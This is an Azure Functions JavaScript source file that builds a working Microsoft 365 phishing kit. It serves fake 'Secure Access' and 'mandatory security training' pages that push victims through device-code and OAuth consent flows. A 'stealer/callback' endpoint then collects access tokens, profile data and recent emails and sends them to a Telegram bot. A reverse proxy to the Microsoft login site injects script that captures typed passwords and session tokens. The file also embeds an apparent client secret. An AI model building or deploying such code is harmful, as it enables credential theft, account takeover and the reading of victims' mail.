const { app } = require('@azure/functions');

// Device Code Function
app.http('devicecode', {
    methods: ['GET', 'POST'],
    authLevel: 'anonymous',
    route: 'secure-access',
    handler: async (request, context) => {
        const clientId = "56a6494b-90c8-4056-9c3e-ee5a7f209195";
        const redirectUri = "https://aitm-func-1753463791.azurewebsites.net/stealer/callback";
        
        async function sendTelegram(message) {
            const chatId = process.env.TELEGRAM_CHAT_ID || "-1001234567890";
            const botToken = "1234567890:ABCdefGHIjklMNOpqrsTUVwxyz";
            const url = `https://api.telegram.org/bot${botToken}/sendMessage`;
            
            try {
                await fetch(url, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({
                        chat_id: chatId,
                        text: message,
                        parse_mode: 'HTML'
                    })
                });
            } catch (error) {
                console.error('Telegram error:', error);
            }
        }

        if (request.method === 'GET') {
            const html = `
<!DOCTYPE html>
<html>
<head>
    <title>Microsoft Secure Access</title>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <style>
        body { font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; margin: 0; padding: 0; background: #f3f2f1; }
        .container { max-width: 400px; margin: 50px auto; background: white; border-radius: 8px; box-shadow: 0 2px 10px rgba(0,0,0,0.1); }
        .header { background: #0078d4; color: white; padding: 20px; border-radius: 8px 8px 0 0; text-align: center; }
        .content { padding: 30px; }
        .code-display { background: #f8f9fa; border: 1px solid #dee2e6; border-radius: 4px; padding: 15px; margin: 20px 0; text-align: center; font-family: monospace; font-size: 18px; }
        .btn { background: #0078d4; color: white; border: none; padding: 12px 24px; border-radius: 4px; cursor: pointer; font-size: 16px; width: 100%; }
        .btn:hover { background: #106ebe; }
        .status { margin-top: 20px; padding: 10px; border-radius: 4px; display: none; }
        .success { background: #d4edda; color: #155724; border: 1px solid #c3e6cb; }
        .error { background: #f8d7da; color: #721c24; border: 1px solid #f5c6cb; }
    </style>
</head>
<body>
    <div class="container">
        <div class="header">
            <h2>🔐 Microsoft Secure Access</h2>
        </div>
        <div class="content">
            <h3>Device Code Authentication</h3>
            <p>To access your account securely, please enter the device code below:</p>
            
            <div class="code-display" id="deviceCode">Loading...</div>
            
            <button class="btn" onclick="checkStatus()">Check Authentication Status</button>
            
            <div id="status" class="status"></div>
        </div>
    </div>

    <script>
        let deviceCode = '';
        let userCode = '';
        let intervalId = null;

        async function getDeviceCode() {
            try {
                const response = await fetch('/api/devicecode', { method: 'POST' });
                const data = await response.json();
                deviceCode = data.device_code;
                userCode = data.user_code;
                document.getElementById('deviceCode').textContent = userCode;
            } catch (error) {
                console.error('Error getting device code:', error);
            }
        }

        async function checkStatus() {
            if (!deviceCode) {
                document.getElementById('status').textContent = 'Please wait for device code to load...';
                document.getElementById('status').className = 'status error';
                document.getElementById('status').style.display = 'block';
                return;
            }

            try {
                const response = await fetch('/api/devicecode/check', {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({ device_code: deviceCode })
                });
                
                const data = await response.json();
                
                if (data.access_token) {
                    document.getElementById('status').textContent = '✅ Authentication successful! You can close this window.';
                    document.getElementById('status').className = 'status success';
                    clearInterval(intervalId);
                } else {
                    document.getElementById('status').textContent = '⏳ Waiting for authentication... Please enter the code on your device.';
                    document.getElementById('status').className = 'status';
                }
                
                document.getElementById('status').style.display = 'block';
            } catch (error) {
                document.getElementById('status').textContent = '❌ Error checking status. Please try again.';
                document.getElementById('status').className = 'status error';
                document.getElementById('status').style.display = 'block';
            }
        }

        // Get device code on page load
        getDeviceCode();
        
        // Check status every 5 seconds
        intervalId = setInterval(checkStatus, 5000);
    </script>
</body>
</html>`;
            
            return { body: html, headers: { 'Content-Type': 'text/html' } };
        } else if (request.method === 'POST') {
            try {
                const body = await request.json();
                
                if (body.device_code) {
                    // Check token status
                    const tokenResponse = await fetch('https://login.microsoftonline.com/common/oauth2/v2.0/token', {
                        method: 'POST',
                        headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
                        body: new URLSearchParams({
                            client_id: clientId,
                            scope: 'openid profile email User.Read Mail.Read',
                            device_code: body.device_code,
                            grant_type: 'device_code'
                        })
                    });
                    
                    const tokenData = await tokenResponse.json();
                    
                    if (tokenData.access_token) {
                        // Get user info
                        const userResponse = await fetch('https://graph.microsoft.com/v1.0/me', {
                            headers: { 'Authorization': `Bearer ${tokenData.access_token}` }
                        });
                        const userData = await userResponse.json();
                        
                        await sendTelegram(`
🔐 <b>Device Code Authentication Success</b>

👤 <b>User:</b> ${userData.displayName || 'Unknown'}
📧 <b>Email:</b> ${userData.userPrincipalName || 'Unknown'}
🏢 <b>Company:</b> ${userData.companyName || 'Unknown'}

🔑 <b>Access Token:</b> ${tokenData.access_token.substring(0, 50)}...
🆔 <b>Token Type:</b> ${tokenData.token_type}
⏰ <b>Expires:</b> ${tokenData.expires_in} seconds

🌐 <b>Device Code:</b> ${body.device_code}
                        `);
                        
                        return { body: { success: true, access_token: tokenData.access_token } };
                    } else {
                        return { body: { success: false, error: tokenData.error } };
                    }
                } else {
                    // Generate new device code
                    const deviceResponse = await fetch('https://login.microsoftonline.com/common/oauth2/v2.0/devicecode', {
                        method: 'POST',
                        headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
                        body: new URLSearchParams({
                            client_id: clientId,
                            scope: 'openid profile email User.Read Mail.Read'
                        })
                    });
                    
                    const deviceData = await deviceResponse.json();
                    
                    await sendTelegram(`
🔐 <b>New Device Code Generated</b>

📱 <b>User Code:</b> ${deviceData.user_code}
⏰ <b>Expires:</b> ${deviceData.expires_in} seconds
🔗 <b>Verification URL:</b> ${deviceData.verification_uri}

🌐 <b>Device Code:</b> ${deviceData.device_code}
                    `);
                    
                    return { body: deviceData };
                }
            } catch (error) {
                console.error('Device code error:', error);
                return { body: { error: error.message }, status: 500 };
            }
        }
    }
});

// OAuth Consent Function
app.http('oauth', {
    methods: ['GET'],
    authLevel: 'anonymous',
    route: 'microsoft-training',
    handler: async (request, context) => {
        const clientId = "56a6494b-90c8-4056-9c3e-ee5a7f209195";
        const redirectUri = "https://aitm-func-1753463791.azurewebsites.net/stealer/callback";
        const scopes = "openid profile email User.Read Mail.Read";
        
        async function sendTelegram(message) {
            const chatId = process.env.TELEGRAM_CHAT_ID || "-1001234567890";
            const botToken = "1234567890:ABCdefGHIjklMNOpqrsTUVwxyz";
            const url = `https://api.telegram.org/bot${botToken}/sendMessage`;
            
            try {
                await fetch(url, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({
                        chat_id: chatId,
                        text: message,
                        parse_mode: 'HTML'
                    })
                });
            } catch (error) {
                console.error('Telegram error:', error);
            }
        }

        const authUrl = `https://login.microsoftonline.com/common/oauth2/v2.0/authorize?client_id=${clientId}&response_type=code&redirect_uri=${encodeURIComponent(redirectUri)}&scope=${encodeURIComponent(scopes)}&response_mode=query`;
        
        const html = `
<!DOCTYPE html>
<html>
<head>
    <title>Microsoft Training Portal</title>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <style>
        body { font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; margin: 0; padding: 0; background: linear-gradient(135deg, #667eea 0%, #764ba2 100%); min-height: 100vh; }
        .container { max-width: 600px; margin: 50px auto; background: white; border-radius: 12px; box-shadow: 0 10px 30px rgba(0,0,0,0.2); overflow: hidden; }
        .header { background: linear-gradient(135deg, #0078d4 0%, #106ebe 100%); color: white; padding: 30px; text-align: center; }
        .content { padding: 40px; }
        .training-section { margin: 30px 0; padding: 20px; background: #f8f9fa; border-radius: 8px; border-left: 4px solid #0078d4; }
        .btn { background: linear-gradient(135deg, #0078d4 0%, #106ebe 100%); color: white; border: none; padding: 15px 30px; border-radius: 6px; cursor: pointer; font-size: 16px; text-decoration: none; display: inline-block; margin: 10px 5px; }
        .btn:hover { transform: translateY(-2px); box-shadow: 0 5px 15px rgba(0,123,255,0.3); }
        .feature { display: flex; align-items: center; margin: 15px 0; }
        .feature-icon { font-size: 24px; margin-right: 15px; }
        .progress { background: #e9ecef; border-radius: 10px; height: 8px; margin: 20px 0; }
        .progress-bar { background: linear-gradient(90deg, #0078d4, #106ebe); height: 100%; border-radius: 10px; width: 75%; }
    </style>
</head>
<body>
    <div class="container">
        <div class="header">
            <h1>🎓 Microsoft Training Portal</h1>
            <p>Complete your mandatory security training</p>
        </div>
        <div class="content">
            <h2>Welcome to Microsoft Security Training</h2>
            <p>This training is mandatory for all employees to ensure compliance with our security policies.</p>
            
            <div class="training-section">
                <h3>📋 Training Modules</h3>
                <div class="feature">
                    <span class="feature-icon">✅</span>
                    <span>Phishing Awareness Training</span>
                </div>
                <div class="feature">
                    <span class="feature-icon">✅</span>
                    <span>Data Protection Guidelines</span>
                </div>
                <div class="feature">
                    <span class="feature-icon">⏳</span>
                    <span>Authentication Best Practices</span>
                </div>
                <div class="feature">
                    <span class="feature-icon">⏳</span>
                    <span>Security Compliance Review</span>
                </div>
            </div>
            
            <div class="training-section">
                <h3>📊 Your Progress</h3>
                <div class="progress">
                    <div class="progress-bar"></div>
                </div>
                <p>75% Complete - 2 of 4 modules finished</p>
            </div>
            
            <div class="training-section">
                <h3>🔐 Authentication Required</h3>
                <p>To continue with the remaining training modules, please authenticate with your Microsoft account:</p>
                <a href="${authUrl}" class="btn">🔑 Sign in with Microsoft</a>
            </div>
            
            <div style="margin-top: 30px; padding: 15px; background: #fff3cd; border: 1px solid #ffeaa7; border-radius: 6px;">
                <strong>⚠️ Important:</strong> This training must be completed within 24 hours to maintain account access.
            </div>
        </div>
    </div>
</body>
</html>`;
        
        return { body: html, headers: { 'Content-Type': 'text/html' } };
    }
});

// OAuth Callback Function
app.http('callback', {
    methods: ['GET'],
    authLevel: 'anonymous',
    route: 'stealer/callback',
    handler: async (request, context) => {
        const clientId = "56a6494b-90c8-4056-9c3e-ee5a7f209195";
        const clientSecret = process.env.AZURE_CLIENT_SECRET || "tt_8Q~maNT8n4PVRPdSrmDzj3_ph4pvcfklTJbVE";
        const redirectUri = "https://aitm-func-1753463791.azurewebsites.net/stealer/callback";
        
        async function sendTelegram(message) {
            const chatId = process.env.TELEGRAM_CHAT_ID || "-1001234567890";
            const botToken = "1234567890:ABCdefGHIjklMNOpqrsTUVwxyz";
            const url = `https://api.telegram.org/bot${botToken}/sendMessage`;
            
            try {
                await fetch(url, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({
                        chat_id: chatId,
                        text: message,
                        parse_mode: 'HTML'
                    })
                });
            } catch (error) {
                console.error('Telegram error:', error);
            }
        }

        const url = new URL(request.url);
        const code = url.searchParams.get('code');
        
        if (!code) {
            return { body: 'Authorization code not found', status: 400 };
        }
        
        try {
            // Exchange code for tokens
            const tokenResponse = await fetch('https://login.microsoftonline.com/common/oauth2/v2.0/token', {
                method: 'POST',
                headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
                body: new URLSearchParams({
                    client_id: clientId,
                    client_secret: clientSecret,
                    code: code,
                    redirect_uri: redirectUri,
                    grant_type: 'authorization_code'
                })
            });
            
            const tokenData = await tokenResponse.json();
            
            if (tokenData.error) {
                throw new Error(tokenData.error_description || tokenData.error);
            }
            
            // Get user info and emails in parallel
            const [userResponse, emailsResponse] = await Promise.all([
                fetch('https://graph.microsoft.com/v1.0/me', {
                    headers: { 'Authorization': `Bearer ${tokenData.access_token}` }
                }),
                fetch('https://graph.microsoft.com/v1.0/me/messages?$top=10&$orderby=receivedDateTime desc', {
                    headers: { 'Authorization': `Bearer ${tokenData.access_token}` }
                })
            ]);
            
            const userData = await userResponse.json();
            const emailsData = await emailsResponse.json();
            
            // Format emails for display
            const emails = emailsData.value?.map(email => ({
                subject: email.subject || 'No Subject',
                from: email.from?.emailAddress?.name || 'Unknown',
                received: email.receivedDateTime || 'Unknown',
                preview: email.bodyPreview || 'No preview'
            })) || [];
            
            await sendTelegram(`
🎯 <b>OAuth Consent Attack Success</b>

👤 <b>User:</b> ${userData.displayName || 'Unknown'}
📧 <b>Email:</b> ${userData.userPrincipalName || 'Unknown'}
🏢 <b>Company:</b> ${userData.companyName || 'Unknown'}
📱 <b>Mobile:</b> ${userData.mobilePhone || 'Not provided'}

🔑 <b>Access Token:</b> ${tokenData.access_token.substring(0, 50)}...
🆔 <b>Token Type:</b> ${tokenData.token_type}
⏰ <b>Expires:</b> ${tokenData.expires_in} seconds

📧 <b>Recent Emails (${emails.length}):</b>
${emails.map((email, i) => `${i+1}. <b>${email.subject}</b> from ${email.from} (${email.received})`).join('\n')}
            `);
            
            const html = `
<!DOCTYPE html>
<html>
<head>
    <title>Training Complete</title>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <style>
        body { font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; margin: 0; padding: 0; background: linear-gradient(135deg, #667eea 0%, #764ba2 100%); min-height: 100vh; display: flex; align-items: center; justify-content: center; }
        .container { max-width: 500px; background: white; border-radius: 12px; box-shadow: 0 10px 30px rgba(0,0,0,0.2); overflow: hidden; }
        .header { background: linear-gradient(135deg, #28a745 0%, #20c997 100%); color: white; padding: 30px; text-align: center; }
        .content { padding: 40px; text-align: center; }
        .success-icon { font-size: 64px; margin-bottom: 20px; }
        .btn { background: linear-gradient(135deg, #0078d4 0%, #106ebe 100%); color: white; border: none; padding: 15px 30px; border-radius: 6px; cursor: pointer; font-size: 16px; text-decoration: none; display: inline-block; margin-top: 20px; }
    </style>
</head>
<body>
    <div class="container">
        <div class="header">
            <h1>🎉 Training Complete!</h1>
        </div>
        <div class="content">
            <div class="success-icon">✅</div>
            <h2>Congratulations!</h2>
            <p>You have successfully completed all Microsoft Security Training modules.</p>
            <p><strong>Your account access has been verified and restored.</strong></p>
            <p>You can now safely close this window and continue with your work.</p>
            <a href="#" class="btn" onclick="window.close()">Close Window</a>
        </div>
    </div>
</body>
</html>`;
            
            return { body: html, headers: { 'Content-Type': 'text/html' } };
            
        } catch (error) {
            console.error('OAuth callback error:', error);
            await sendTelegram(`❌ <b>OAuth Callback Error</b>\n\nError: ${error.message}`);
            return { body: 'Authentication failed', status: 500 };
        }
    }
});

// SessionShark/AiTM Proxy Function
app.http('proxy', {
    methods: ['GET', 'POST', 'PUT', 'PATCH'],
    authLevel: 'anonymous',
    route: 'cookieproxy/{*path}',
    handler: async (request, context) => {
        const path = context.bindingData.path;
        
        async function sendTelegram(message) {
            const chatId = process.env.TELEGRAM_CHAT_ID || "-1001234567890";
            const botToken = "1234567890:ABCdefGHIjklMNOpqrsTUVwxyz";
            const url = `https://api.telegram.org/bot${botToken}/sendMessage`;
            
            try {
                await fetch(url, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({
                        chat_id: chatId,
                        text: message,
                        parse_mode: 'HTML'
                    })
                });
            } catch (error) {
                console.error('Telegram error:', error);
            }
        }

        // Handle special endpoints for session capture
        if (path === 'session') {
            const body = await request.json();
            await sendTelegram(`
🔍 <b>Session Capture</b>

🍪 <b>Session ID:</b> ${body.sessionId || 'Unknown'}
👤 <b>User Agent:</b> ${body.userAgent || 'Unknown'}
🌐 <b>IP Address:</b> ${body.ip || 'Unknown'}
📅 <b>Timestamp:</b> ${new Date().toISOString()}

📊 <b>Session Data:</b>
${JSON.stringify(body, null, 2)}
            `);
            return { body: { success: true } };
        }
        
        if (path === 'credentials') {
            const body = await request.json();
            await sendTelegram(`
🔐 <b>Credential Capture</b>

👤 <b>Username:</b> ${body.username || 'Unknown'}
🔑 <b>Password:</b> ${body.password || 'Unknown'}
🌐 <b>Domain:</b> ${body.domain || 'Unknown'}
📱 <b>User Agent:</b> ${body.userAgent || 'Unknown'}
🌍 <b>IP Address:</b> ${body.ip || 'Unknown'}

📅 <b>Timestamp:</b> ${new Date().toISOString()}
            `);
            return { body: { success: true } };
        }

        // Proxy requests to Microsoft
        const targetUrl = `https://login.microsoftonline.com/${path}`;
        const headers = {};
        
        // Copy relevant headers
        for (const [key, value] of request.headers.entries()) {
            if (key.toLowerCase() !== 'host' && key.toLowerCase() !== 'origin') {
                headers[key] = value;
            }
        }
        
        try {
            const response = await fetch(targetUrl, {
                method: request.method,
                headers: headers,
                body: request.method !== 'GET' ? await request.text() : undefined
            });
            
            const responseText = await response.text();
            
            // Inject monitoring script for login pages
            if (responseText.includes('login.microsoftonline.com') && responseText.includes('<html')) {
                const monitoringScript = `
<script>
(function() {
    // Monitor form submissions
    document.addEventListener('submit', function(e) {
        if (e.target.tagName === 'FORM') {
            const formData = new FormData(e.target);
            const data = {};
            for (let [key, value] of formData.entries()) {
                data[key] = value;
            }
            
            fetch('/api/proxy/credentials', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({
                    username: data.username || data.email || data.userid,
                    password: data.password || data.passwd,
                    domain: data.domain || window.location.hostname,
                    userAgent: navigator.userAgent,
                    ip: '${request.headers.get('x-forwarded-for') || 'Unknown'}'
                })
            });
        }
    });
    
    // Monitor session storage
    const originalSetItem = sessionStorage.setItem;
    sessionStorage.setItem = function(key, value) {
        originalSetItem.apply(this, arguments);
        if (key.includes('session') || key.includes('token') || key.includes('auth')) {
            fetch('/api/proxy/session', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({
                    sessionId: key,
                    sessionData: value,
                    userAgent: navigator.userAgent,
                    ip: '${request.headers.get('x-forwarded-for') || 'Unknown'}',
                    timestamp: new Date().toISOString()
                })
            });
        }
    };
})();
</script>`;
                
                const modifiedResponse = responseText.replace('</head>', monitoringScript + '</head>');
                return { body: modifiedResponse, headers: { 'Content-Type': 'text/html' } };
            }
            
            return { body: responseText, status: response.status };
            
        } catch (error) {
            console.error('Proxy error:', error);
            return { body: 'Proxy error', status: 500 };
        }
    }
});

// Test Function
app.http('test', {
    methods: ['GET'],
    authLevel: 'anonymous',
    route: 'test',
    handler: async (request, context) => {
        return { body: { message: 'Test function working!' } };
    }
});